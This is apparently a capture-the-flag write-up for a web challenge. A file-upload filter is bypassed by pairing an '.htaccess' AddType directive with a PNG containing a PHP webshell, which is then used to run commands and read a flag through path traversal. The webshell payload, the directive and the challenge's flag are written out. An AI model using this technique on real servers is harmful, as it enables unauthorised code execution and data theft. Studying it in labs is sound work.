# byp4ss3d

**Platform:** CyLab Security Academy (picoMini by CMU-Africa)
**Category:** Web Exploitation
**Difficulty:** Medium
**Author:** Yahaya Meddy
**Date completed:** 2026-11-27

## Challenge
A university registration portal lets students upload ID card images. The developer added filters to only allow image files — but are they enough? Clue pointed toward `.htaccess`.

## Steps
1. Recognized this as a classic file-upload-filter bypass. Since `.php` extensions are almost certainly blocked by the filter, went looking for the `.htaccess` bypass technique: upload a config file that makes Apache treat a non-PHP-extension file (e.g. `.jpg`/`.png`) as executable PHP.
2. Core idea: two separate uploads needed —
   - a file literally named `.htaccess` containing a directive like `AddType application/x-httpd-php .png`
   - a second file with an allowed extension (`.png`) containing actual PHP code, e.g. `<?php system($_GET['cmd']); ?>`
3. Ran `whatweb` against the target first to fingerprint the stack before doing anything else, then confirmed the server was Apache + PHP via `curl -I`:
   ```
   Server: Apache/2.4.68 (Debian)
   X-Powered-By: PHP/8.3.33
   ```
4. First attempts failed — requesting the uploaded payload file just returned the raw PHP source text (`<?php system($_GET['cmd']); ?>`) instead of executing it, meaning the `.htaccess` directive wasn't taking effect at all.
5. Tried several variations of the `.htaccess` content while troubleshooting, including some that didn't make sense together in one file (`AddType application/x-httpd-php .htaccess`, a leftover PHP comment `# <?php phpinfo(); ?>`, `SetHandler server-status`, `SetHandler server-info`) — none of these fixed the problem.
6. **Root cause found**: the `.htaccess` file wasn't actually being uploaded at all. Local file manager/terminal view was hiding dotfiles by default, so the `.htaccess` file silently never made it into the upload selection alongside the image payload. Enabling "show hidden files" revealed it was missing from what was actually being sent to the server.
7. Once both files were uploaded together properly — `.htaccess` with `AddType application/x-httpd-php .png` and `test.png` with `<?php echo "hacked"; ?>` — visiting `test.png` in the browser displayed `hacked`, confirming PHP execution was finally working.
8. Switched the payload to `<?php system($_GET['cmd']); ?>` and tested `?cmd=whoami` — worked.
9. Enumerated the filesystem with `?cmd=ls` to see what was around.
10. `flag.txt` wasn't in the same directory as the uploads folder — used path traversal in the command argument to reach it:
    ```
    http://xebec.cylabacademy.net:35168/images/test.png?cmd=cat ../../flag.txt
    ```
    This returned the flag.

## Mistakes along the way
- Early confusion mixing up filenames — accidentally renamed a file that was meant to become `.htaccess` into `shell.jpg`/`shell.php` and vice versa, ending up with garbled file contents that combined unrelated directives (`AddType application/x-httpd-php .rce`, a stray PHP comment, and two conflicting `SetHandler` lines) in a single file instead of two clean, separate files.
- Tried `AddType`/`SetHandler` variations without first confirming whether `.htaccess` was even reaching the server — spent time guessing directive syntax when the real issue was the file never being uploaded.
- Mistook the browser's "image cannot be displayed, it contains errors" message for an upload failure — it was actually just the browser trying (and failing) to render non-image PHP-source text as a real image, which is expected and not a sign anything was wrong with the upload itself.
- The actual blocker — a hidden-file visibility setting on the local machine silently excluding `.htaccess` from the upload selection — was invisible until deliberately turning on "show hidden files," which is an easy thing to overlook since dotfiles don't show by default in most file pickers.

## Tools used
- `curl`, `nano`, browser (for initial payload testing), the web upload form itself

## Lesson learned
- The `.htaccess` + alternate-extension trick needs **both files present together** in the same upload directory — if either one is missing, nothing works, and the resulting symptom (raw PHP source returned instead of executed output) looks identical whether the `.htaccess` content is wrong or the file is simply absent. Always verify the `.htaccess` actually made it to the server (e.g. check for a 403 when requesting it directly — Apache blocks serving it, but a 403 proves it exists) before troubleshooting directive syntax.
- Dotfiles (hidden files) can silently get excluded from local file pickers/explorers — when something that should obviously work doesn't, check whether all the pieces you think you selected were actually included.
- A browser failing to "display" a file as an image is not evidence of an upload error — it just means the file's bytes aren't valid image data, which is actually expected once PHP code starts executing and producing text output instead of binary image content.
- Command output via `system()` combined with path traversal (`cat ../../flag.txt`) is a reliable way to reach files outside the immediate upload directory once code execution is achieved — the flag doesn't have to be sitting right next to the webshell.

## Flag
`academy{s3rv3r_byp4ss_a63b4ced}`